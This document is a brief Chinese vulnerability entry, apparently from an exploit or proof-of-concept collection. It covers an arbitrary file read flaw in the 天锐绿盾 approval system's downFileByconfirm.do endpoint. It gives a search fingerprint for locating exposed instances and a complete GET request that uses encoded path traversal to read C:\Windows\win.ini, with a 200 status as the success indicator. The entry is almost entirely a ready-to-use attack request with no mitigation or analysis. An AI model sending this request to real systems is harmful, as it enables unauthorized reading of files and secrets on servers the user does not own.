# 天锐绿盾审批系统downFileByconfirm.do任意文件读取漏洞

天锐绿盾 ｜ 任意文件读取/写入 ｜ —
- **指纹**：`app="TIPPAY-绿盾审批系统"`
- **请求**：`GET /trwfe/service/.%2E/file/downFileByconfirm.do?dstPath=C:\Windows\win.ini&fileName=&processInstanceIds= HTTP/1.1`
- **响应特征**：200